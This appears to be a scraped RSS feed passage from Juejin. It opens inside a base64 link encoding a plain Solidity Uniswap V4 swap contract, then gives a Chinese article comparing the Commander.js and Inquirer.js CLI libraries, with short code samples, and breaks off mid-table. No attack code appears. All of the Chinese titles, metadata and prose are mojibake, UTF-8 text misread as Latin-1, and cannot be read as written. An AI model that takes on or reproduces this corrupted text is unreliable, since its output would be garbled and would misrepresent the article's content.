lmeWluZyB0aGUgcG9vbAogICAgLy8vIEBwYXJhbSBhbW91bnRJbiBBbW91bnQgb2YgaW5wdXQgdG9rZW5zIHRvIHN3YXAKICAgIC8vLyBAcGFyYW0gbWluQW1vdW50T3V0IE1pbmltdW0gYWNjZXB0YWJsZSBvdXRwdXQgYW1vdW50CiAgICBmdW5jdGlvbiBzd2FwRXhhY3RJbnB1dCgKICAgICAgICBQb29sS2V5IGNhbGxkYXRhIGtleSwKICAgICAgICB1aW50MTI4IGFtb3VudEluLAogICAgICAgIHVpbnQxMjggbWluQW1vdW50T3V0CiAgICApIGV4dGVybmFsIHJldHVybnMgKHVpbnQyNTYgYW1vdW50T3V0KSB7CiAgICAgICAgLy8gRW5jb2RlIHN3YXAgcGFyYW1ldGVycyB0byBwYXNzIHRocm91Z2ggdW5sb2NrIGNhbGxiYWNrCiAgICAgICAgYnl0ZXMgbWVtb3J5IGRhdGEgPSBhYmkuZW5jb2RlKAogICAgICAgICAgICBTd2FwUGFyYW1zKHsKICAgICAgICAgICAgICAgIGtleToga2V5LAogICAgICAgICAgICAgICAgYW1vdW50SW46IGFtb3VudEluLAogICAgICAgICAgICAgICAgbWluQW1vdW50T3V0OiBtaW5BbW91bnRPdXQsCiAgICAgICAgICAgICAgICB6ZXJvRm9yT25lOiB0cnVlLAogICAgICAgICAgICAgICAgc2VuZGVyOiBtc2cuc2VuZGVyCiAgICAgICAgICAgIH0pCiAgICAgICAgKTsKCiAgICAgICAgLy8gSW5pdGlhdGUgdGhlIHN3YXAgLSBQb29sTWFuYWdlciB3aWxsIGNhbGwgdW5sb2NrQ2FsbGJhY2sKICAgICAgICBieXRlcyBtZW1vcnkgcmVzdWx0ID0gcG9vbE1hbmFnZXIudW5sb2NrKGRhdGEpOwogICAgICAgIGFtb3VudE91dCA9IGFiaS5kZWNvZGUocmVzdWx0LCAodWludDI1NikpOwogICAgfQoKICAgIC8vLyBAbm90aWNlIENhbGxiYWNrIGZyb20gUG9vbE1hbmFnZXIgYWZ0ZXIgdW5sb2NrCiAgICAvLy8gQGRldiBUaGlzIGlzIHdoZXJlIHRoZSBhY3R1YWwgc3dhcCBsb2dpYyBleGVjdXRlcwogICAgZnVuY3Rpb24gdW5sb2NrQ2FsbGJhY2soYnl0ZXMgY2FsbGRhdGEgZGF0YSkKICAgICAgICBleHRlcm5hbAogICAgICAgIG92ZXJyaWRlCiAgICAgICAgcmV0dXJucyAoYnl0ZXMgbWVtb3J5KQogICAgewogICAgICAgIGlmIChtc2cuc2VuZGVyICE9IGFkZHJlc3MocG9vbE1hbmFnZXIpKSByZXZlcnQgTm90UG9vbE1hbmFnZXIoKTsKCiAgICAgICAgU3dhcFBhcmFtcyBtZW1vcnkgcGFyYW1zID0gYWJpLmRlY29kZShkYXRhLCAoU3dhcFBhcmFtcykpOwoKICAgICAgICAvLyBFeGVjdXRlIHRoZSBzd2FwCiAgICAgICAgLy8gemVyb0Zvck9uZTogdHJ1ZSA9IHRva2VuMCAtPiB0b2tlbjEsIGZhbHNlID0gdG9rZW4xIC0+IHRva2VuMAogICAgICAgIC8vIGFtb3VudFNwZWNpZmllZDogbmVnYXRpdmUgPSBleGFjdCBpbnB1dCwgcG9zaXRpdmUgPSBleGFjdCBvdXRwdXQKICAgICAgICBCYWxhbmNlRGVsdGEgZGVsdGEgPSBwb29sTWFuYWdlci5zd2FwKAogICAgICAgICAgICBwYXJhbXMua2V5LAogICAgICAgICAgICBJUG9vbE1hbmFnZXIuU3dhcFBhcmFtcyh7CiAgICAgICAgICAgICAgICB6ZXJvRm9yT25lOiBwYXJhbXMuemVyb0Zvck9uZSwKICAgICAgICAgICAgICAgIGFtb3VudFNwZWNpZmllZDogLWludDI1Nih1aW50MjU2KHBhcmFtcy5hbW91bnRJbikpLAogICAgICAgICAgICAgICAgc3FydFByaWNlTGltaXRYOTY6IHBhcmFtcy56ZXJvRm9yT25lCiAgICAgICAgICAgICAgICAgICAgPyBNSU5fU1FSVF9QUklDRSArIDEKICAgICAgICAgICAgICAgICAgICA6IE1BWF9TUVJUX1BSSUNFIC0gMQogICAgICAgICAgICB9KSwKICAgICAgICAgICAgYnl0ZXMoIiIpCiAgICAgICAgKTsKCiAgICAgICAgLy8gQ2FsY3VsYXRlIGFtb3VudHMgZnJvbSBkZWx0YQogICAgICAgIC8vIGRlbHRhLmFtb3VudDAoKSBpcyBuZWdhdGl2ZSAod2Ugb3dlIHRoZSBwb29sKQogICAgICAgIC8vIGRlbHRhLmFtb3VudDEoKSBpcyBwb3NpdGl2ZSAocG9vbCBvd2VzIHVzKQogICAgICAgIHVpbnQyNTYgYW1vdW50T3V0ID0gcGFyYW1zLnplcm9Gb3JPbmUKICAgICAgICAgICAgPyB1aW50MjU2KGludDI1NihkZWx0YS5hbW91bnQxKCkpKQogICAgICAgICAgICA6IHVpbnQyNTYoaW50MjU2KGRlbHRhLmFtb3VudDAoKSkpOwoKICAgICAgICBpZiAoYW1vdW50T3V0IDwgcGFyYW1zLm1pbkFtb3VudE91dCkgcmV2ZXJ0IFN3YXBGYWlsZWQoKTsKCiAgICAgICAgLy8gU2V0dGxlIHRoZSBpbnB1dCB0b2tlbiAocGF5IHdoYXQgd2Ugb3dlKQogICAgICAgIEN1cnJlbmN5IGlucHV0Q3VycmVuY3kgPSBwYXJhbXMuemVyb0Zvck9uZQogICAgICAgICAgICA/IHBhcmFtcy5rZXkuY3VycmVuY3kwCiAgICAgICAgICAgIDogcGFyYW1zLmtleS5jdXJyZW5jeTE7CgogICAgICAgIElFUkMyMChDdXJyZW5jeS51bndyYXAoaW5wdXRDdXJyZW5jeSkpLnRyYW5zZmVyRnJvbSgKICAgICAgICAgICAgcGFyYW1zLnNlbmRlciwKICAgICAgICAgICAgYWRkcmVzcyhwb29sTWFuYWdlciksCiAgICAgICAgICAgIHBhcmFtcy5hbW91bnRJbgogICAgICAgICk7CiAgICAgICAgcG9vbE1hbmFnZXIuc2V0dGxlKGlucHV0Q3VycmVuY3kpOwoKICAgICAgICAvLyBUYWtlIHRoZSBvdXRwdXQgdG9rZW4gKHJlY2VpdmUgd2hhdCB3ZSdyZSBvd2VkKQogICAgICAgIEN1cnJlbmN5IG91dHB1dEN1cnJlbmN5ID0gcGFyYW1zLnplcm9Gb3JPbmUKICAgICAgICAgICAgPyBwYXJhbXMua2V5LmN1cnJlbmN5MQogICAgICAgICAgICA6IHBhcmFtcy5rZXkuY3VycmVuY3kwOwoKICAgICAgICBwb29sTWFuYWdlci50YWtlKG91dHB1dEN1cnJlbmN5LCBwYXJhbXMuc2VuZGVyLCBhbW91bnRPdXQpOwoKICAgICAgICByZXR1cm4gYWJpLmVuY29kZShhbW91bnRPdXQpOwogICAgfQoKICAgIHN0cnVjdCBTd2FwUGFyYW1zIHsKICAgICAgICBQb29sS2V5IGtleTsKICAgICAgICB1aW50MTI4IGFtb3VudEluOwogICAgICAgIHVpbnQxMjggbWluQW1vdW50T3V0OwogICAgICAgIGJvb2wgemVyb0Zvck9uZTsKICAgICAgICBhZGRyZXNzIHNlbmRlcjsKICAgIH0KfQoKLy8gU3FydCBwcmljZSBsaW1pdHMgZm9yIHN3YXBzCnVpbnQxNjAgY29uc3RhbnQgTUlOX1NRUlRfUFJJQ0UgPSA0Mjk1MTI4NzM5Owp1aW50MTYwIGNvbnN0YW50IE1BWF9TUVJUX1BSSUNFID0KICAgIDE0NjE0NDY3MDM0ODUyMTAxMDMyODcyNzMwNTIyMDM5ODg4MjIzNzg3MjM5NzAzNDI7CgovLyBDdXJyZW5jeSBpcyBhbiBhZGRyZXNzIHdyYXBwZXIgKGFkZHJlc3MoMCkgPSBuYXRpdmUgRVRIKQp0eXBlIEN1cnJlbmN5IGlzIGFkZHJlc3M7CgpsaWJyYXJ5IEN1cnJlbmN5TGlicmFyeSB7CiAgICBmdW5jdGlvbiB1bndyYXAoQ3VycmVuY3kgY3VycmVuY3kpIGludGVybmFsIHB1cmUgcmV0dXJucyAoYWRkcmVzcykgewogICAgICAgIHJldHVybiBDdXJyZW5jeS51bndyYXAoY3VycmVuY3kpOwogICAgfQp9Cgp1c2luZyBDdXJyZW5jeUxpYnJhcnkgZm9yIEN1cnJlbmN5OwoKc3RydWN0IFBvb2xLZXkgewogICAgQ3VycmVuY3kgY3VycmVuY3kwOwogICAgQ3VycmVuY3kgY3VycmVuY3kxOwogICAgdWludDI0IGZlZTsKICAgIGludDI0IHRpY2tTcGFjaW5nOwogICAgYWRkcmVzcyBob29rczsKfQoKLy8vIEBub3RpY2UgQmFsYW5jZSBkZWx0YSByZXR1cm5lZCBmcm9tIHN3YXAgb3BlcmF0aW9ucwovLy8gQGRldiBOZWdhdGl2ZSA9IHlvdSBvd2UgdGhlIHBvb2wsIFBvc2l0aXZlID0gcG9vbCBvd2VzIHlvdQp0eXBlIEJhbGFuY2VEZWx0YSBpcyBpbnQyNTY7CgpsaWJyYXJ5IEJhbGFuY2VEZWx0YUxpYnJhcnkgewogICAgZnVuY3Rpb24gYW1vdW50MChCYWxhbmNlRGVsdGEgZGVsdGEpIGludGVybmFsIHB1cmUgcmV0dXJucyAoaW50MTI4KSB7CiAgICAgICAgcmV0dXJuIGludDEyOChpbnQyNTYoQmFsYW5jZURlbHRhLnVud3JhcChkZWx0YSkgPj4gMTI4KSk7CiAgICB9CgogICAgZnVuY3Rpb24gYW1vdW50MShCYWxhbmNlRGVsdGEgZGVsdGEpIGludGVybmFsIHB1cmUgcmV0dXJucyAoaW50MTI4KSB7CiAgICAgICAgcmV0dXJuIGludDEyOChpbnQyNTYoQmFsYW5jZURlbHRhLnVud3JhcChkZWx0YSkpKTsKICAgIH0KfQoKdXNpbmcgQmFsYW5jZURlbHRhTGlicmFyeSBmb3IgQmFsYW5jZURlbHRhOwoKaW50ZXJmYWNlIElQb29sTWFuYWdlciB7CiAgICBzdHJ1Y3QgU3dhcFBhcmFtcyB7CiAgICAgICAgYm9vbCB6ZXJvRm9yT25lOwogICAgICAgIGludDI1NiBhbW91bnRTcGVjaWZpZWQ7CiAgICAgICAgdWludDE2MCBzcXJ0UHJpY2VMaW1pdFg5NjsKICAgIH0KCiAgICBmdW5jdGlvbiB1bmxvY2soYnl0ZXMgY2FsbGRhdGEgZGF0YSkgZXh0ZXJuYWwgcmV0dXJucyAoYnl0ZXMgbWVtb3J5KTsKICAgIGZ1bmN0aW9uIHN3YXAoUG9vbEtleSBtZW1vcnkga2V5LCBTd2FwUGFyYW1zIG1lbW9yeSBwYXJhbXMsIGJ5dGVzIGNhbGxkYXRhIGhvb2tEYXRhKQogICAgICAgIGV4dGVybmFsCiAgICAgICAgcmV0dXJucyAoQmFsYW5jZURlbHRhKTsKICAgIGZ1bmN0aW9uIHNldHRsZShDdXJyZW5jeSBjdXJyZW5jeSkgZXh0ZXJuYWwgcGF5YWJsZSByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIHRha2UoQ3VycmVuY3kgY3VycmVuY3ksIGFkZHJlc3MgdG8sIHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbDsKfQoKaW50ZXJmYWNlIElVbmxvY2tDYWxsYmFjayB7CiAgICBmdW5jdGlvbiB1bmxvY2tDYWxsYmFjayhieXRlcyBjYWxsZGF0YSBkYXRhKSBleHRlcm5hbCByZXR1cm5zIChieXRlcyBtZW1vcnkpOwp9CgppbnRlcmZhY2UgSUVSQzIwIHsKICAgIGZ1bmN0aW9uIHRyYW5zZmVyRnJvbShhZGRyZXNzIHNlbmRlciwgYWRkcmVzcyByZWNpcGllbnQsIHVpbnQyNTYgYW1vdW50KQogICAgICAgIGV4dGVybmFsCiAgICAgICAgcmV0dXJucyAoYm9vbCk7CiAgICBmdW5jdGlvbiBhcHByb3ZlKGFkZHJlc3Mgc3BlbmRlciwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwp9Cg==" ref="nofollow noopener noreferrer">UniswapV4Swap.sol</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºä¸“ä¸šå‘½ä»¤è¡Œå·¥å…·ï¼šè§£æ Commander ä¸ Inquirer çš„åä½œä¹‹é“]]></title>    <link>https://juejin.cn/post/7600344784945381422</link>    <guid>https://juejin.cn/post/7600344784945381422</guid>    <pubDate>2026-01-29T06:23:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600344784945381422" data-draft-id="7600344784945348654" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºä¸“ä¸šå‘½ä»¤è¡Œå·¥å…·ï¼šè§£æ Commander ä¸ Inquirer çš„åä½œä¹‹é“"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-29T06:23:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«è½¦å¼ä½"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºä¸“ä¸šå‘½ä»¤è¡Œå·¥å…·ï¼šè§£æ Commander ä¸ Inquirer çš„åä½œä¹‹é“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«è½¦å¼ä½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:23:57.000Z" title="Thu Jan 29 2026 06:23:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Node.js ç”Ÿæ€ä¸­ï¼Œå¼€å‘ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢ï¼ˆCLIï¼‰å·¥å…·å‡ ä¹æ˜¯æ¯ä¸ªé«˜çº§å¼€å‘è€…çš„å¿…ç»ä¹‹è·¯ã€‚ç„¶è€Œï¼Œé¢å¯¹ <strong>Commander.js</strong> å’Œ <strong>Inquirer.js</strong> è¿™ä¸¤ä¸ªé¡¶çº§åº“æ—¶ï¼Œå¾ˆå¤šå¼€å‘è€…ä¼šäº§ç”Ÿå›°æƒ‘ï¼šâ€œæˆ‘åˆ°åº•è¯¥é€‰å“ªä¸€ä¸ªï¼Ÿâ€</p>
<p>å®é™…ä¸Šï¼Œè¿™ç§å›°æƒ‘æºäºå¯¹ä¸¤è€…å®šä½çš„é‡å æ€§è¯¯è§£ã€‚Commander è´Ÿè´£çš„æ˜¯**â€œå‘½ä»¤çš„ç»“æ„â€<strong>ï¼Œè€Œ Inquirer è´Ÿè´£çš„æ˜¯</strong>â€œäº’åŠ¨çš„ä½“éªŒâ€**ã€‚æœ¬æ–‡å°†å¸¦ä½ æ·±å…¥åº•å±‚ï¼Œçœ‹æ¸…å®ƒä»¬çš„ç›¸åŒç‚¹ä¸æœ¬è´¨åŒºåˆ«ï¼ŒåŠ©ä½ åšå‡ºæœ€ç†æ€§çš„æŠ€æœ¯é€‰å‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">1. Commander.jsï¼šCLI çš„éª¨æ¶ä¸è§„åˆ™</h2>
<h3 data-id="heading-1">1.1 æ ¸å¿ƒå®šä½</h3>
<p>Commander æ˜¯ä¸€ä¸ªå®Œæ•´çš„ Node.js å‘½ä»¤è¡Œè§£å†³æ–¹æ¡ˆã€‚å®ƒæ•ˆä»¿äº† Ruby çš„ <code>commander</code>ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯<strong>è§£æï¼ˆParsingï¼‰</strong>ã€‚å®ƒè´Ÿè´£å‘Šè¯‰ç¨‹åºï¼šç”¨æˆ·åœ¨å¯åŠ¨æ—¶è¾“å…¥äº†ä»€ä¹ˆæŒ‡ä»¤ã€å¸¦äº†ä»€ä¹ˆå‚æ•°ã€è®¾ç½®äº†å“ªäº›é€‰é¡¹ã€‚</p>
<h3 data-id="heading-2">1.2 æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>å‚æ•°è§£æ</strong>ï¼šè‡ªåŠ¨å¤„ç† <code>process.argv</code>ï¼Œæ”¯æŒå¿…å¡«å‚æ•° <code>&lt;arg&gt;</code> å’Œå¯é€‰å‚æ•° <code>[arg]</code>ã€‚</li>
<li><strong>é€‰é¡¹å®šä¹‰</strong>ï¼šæ”¯æŒçŸ­é€‰é¡¹ï¼ˆ<code>-f</code>ï¼‰å’Œé•¿é€‰é¡¹ï¼ˆ<code>--force</code>ï¼‰ï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆå¸ƒå°”å€¼æˆ–å‚æ•°å€¼ã€‚</li>
<li><strong>å­å‘½ä»¤ç³»ç»Ÿ</strong>ï¼šé€šè¿‡ <code>.command()</code> æ„å»ºç±»ä¼¼ <code>git push</code>ã€<code>git pull</code> çš„åµŒå¥—ç»“æ„ã€‚</li>
<li><strong>è‡ªåŠ¨æ–‡æ¡£</strong>ï¼šåŸºäºå®šä¹‰è‡ªåŠ¨ç”Ÿæˆ <code>-h, --help</code> å¸®åŠ©ä¿¡æ¯ã€‚</li>
</ul>
<h3 data-id="heading-3">1.3 ä»£ç ç¤ºä¾‹ï¼ˆåŸºäºæ–‡æ¡£ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { program } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'commander'</span>);

program
  .<span class="hljs-title function_">name</span>(<span class="hljs-string">'pizza-cli'</span>)
  .<span class="hljs-title function_">description</span>(<span class="hljs-string">'è®¢è´­çš®è¨çš„å·¥å…·'</span>)
  .<span class="hljs-title function_">version</span>(<span class="hljs-string">'1.0.0'</span>);

program
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'-s, --size &lt;type&gt;'</span>, <span class="hljs-string">'çš®è¨å°ºå¯¸'</span>, <span class="hljs-string">'medium'</span>)
  .<span class="hljs-title function_">option</span>(<span class="hljs-string">'-d, --debug'</span>, <span class="hljs-string">'å¼€å¯è°ƒè¯•æ¨¡å¼'</span>)
  .<span class="hljs-title function_">action</span>(<span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ‚¨è®¢è´­äº†ä¸€ä¸ª <span class="hljs-subst">${options.size}</span> å°ºå¯¸çš„çš®è¨ã€‚`</span>);
  });

program.<span class="hljs-title function_">parse</span>();
</code></pre>
<hr/>
<h2 data-id="heading-4">2. Inquirer.jsï¼šCLI çš„è¡€è‚‰ä¸äº¤äº’</h2>
<h3 data-id="heading-5">2.1 æ ¸å¿ƒå®šä½</h3>
<p>Inquirer æ˜¯ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œç”¨æˆ·ç•Œé¢çš„é›†åˆã€‚å®ƒçš„ç›®æ ‡æ˜¯<strong>å¼•å¯¼ï¼ˆGuidingï¼‰</strong>ã€‚å½“ä½ çš„ç¨‹åºéœ€è¦ä»ç”¨æˆ·é‚£é‡Œè·å–éé¢„è®¾çš„ã€å¤æ‚çš„ä¿¡æ¯æ—¶ï¼ŒInquirer æä¾›äº†ä¸°å¯Œçš„ UI ç»„ä»¶ã€‚</p>
<h3 data-id="heading-6">2.2 æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>å¤šæ ·åŒ–è¾“å…¥</strong>ï¼šæ”¯æŒ <code>input</code>ï¼ˆæ–‡æœ¬ï¼‰ã€<code>password</code>ï¼ˆé®ç½©ï¼‰ã€<code>confirm</code>ï¼ˆç¡®è®¤ï¼‰ã€<code>select</code>ï¼ˆå•é€‰ï¼‰ã€<code>checkbox</code>ï¼ˆå¤šé€‰ï¼‰ç­‰ã€‚</li>
<li><strong>æµå¼å¯¹è¯</strong>ï¼šå¯ä»¥æ ¹æ®ä¸Šä¸€æ­¥çš„å›ç­”åŠ¨æ€å†³å®šä¸‹ä¸€æ­¥æé—®çš„å†…å®¹ã€‚</li>
<li><strong>è¾“å…¥æ ¡éªŒ</strong>ï¼šå†…ç½® <code>validate</code> é’©å­ï¼Œå®æ—¶åé¦ˆè¾“å…¥é”™è¯¯ã€‚</li>
<li><strong>æ–°ç‰ˆä¼˜åŒ–</strong>ï¼šæœ€æ–°ç‰ˆï¼ˆ<code>@inquirer/prompts</code>ï¼‰é‡‡ç”¨äº†æ›´è½»é‡ã€æ€§èƒ½æ›´é«˜çš„æ¶æ„ï¼Œå¹¶æ”¯æŒæ›´çµæ´»çš„å¼‚æ­¥æ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-7">2.3 ä»£ç ç¤ºä¾‹ï¼ˆåŸºäºæ–‡æ¡£ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { input, select } <span class="hljs-keyword">from</span> <span class="hljs-string">'@inquirer/prompts'</span>;

<span class="hljs-keyword">const</span> name = <span class="hljs-keyword">await</span> <span class="hljs-title function_">input</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„åå­—'</span> });
<span class="hljs-keyword">const</span> color = <span class="hljs-keyword">await</span> <span class="hljs-title function_">select</span>({
  <span class="hljs-attr">message</span>: <span class="hljs-string">'é€‰æ‹©ä½ å–œæ¬¢çš„é¢œè‰²'</span>,
  <span class="hljs-attr">choices</span>: [
    { <span class="hljs-attr">name</span>: <span class="hljs-string">'çº¢è‰²'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'red'</span> },
    { <span class="hljs-attr">name</span>: <span class="hljs-string">'è“è‰²'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'blue'</span> },
  ],
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ å¥½ <span class="hljs-subst">${name}</span>ï¼Œä½ é€‰æ‹©äº† <span class="hljs-subst">${color}</span>ã€‚`</span>);
</code></pre>
<hr/>
<h2 data-id="heading-8">3. æ·±åº¦å¯¹æ¯”ï¼šç›¸åŒç‚¹ä¸ä¸åŒç‚¹</h2>
<p>ä¸ºäº†è¾…åŠ©é€‰å‹ï¼Œæˆ‘ä»¬å°†ä¸¤è€…è¿›è¡Œå¤šç»´åº¦çš„æ¨ªå‘å¯¹æ¯”ï¼š</p>



































<table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Commander.js</th><th align="left">Inquirer.js</th></tr></thead><tbody><tr><td align="left"><strong>äº¤äº’æ¨¡å¼</strong></td><td align="left"><strong>é™æ€/å£°æ˜å¼</strong>ï¼šç”¨æˆ·å¯åŠ¨å‰å†³å®šä¸€åˆ‡</td><td align="left"><strong>åŠ¨æ€/äº¤äº’å¼</strong>ï¼šç¨‹åºè¿è¡Œä¸­å®æ—¶é—®ç­”</td></tr><tr><td align="left"><strong>ä¸»è¦èŒè´£</strong></td><td align="left">å‘½ä»¤è§£æã€ç‰ˆæœ¬ç®¡ç†ã€å¸®åŠ©ä¿¡æ¯ã€å­å‘½ä»¤è°ƒåº¦</td><td align="left">æ”¶é›†ç”¨æˆ·è¾“å…¥ã€æ•°æ®æ ¡éªŒã€æµç¨‹å¼•å¯¼ã€UI å‘ˆç°</td></tr><tr><td align="left"><strong>è‡ªåŠ¨åŒ–æ”¯æŒ</strong></td><td align="left"><strong>æä½³</strong>ï¼šå®Œç¾æ”¯æŒ CI/CDã€è„šæœ¬è‡ªåŠ¨åŒ–è°ƒç”¨</td><td 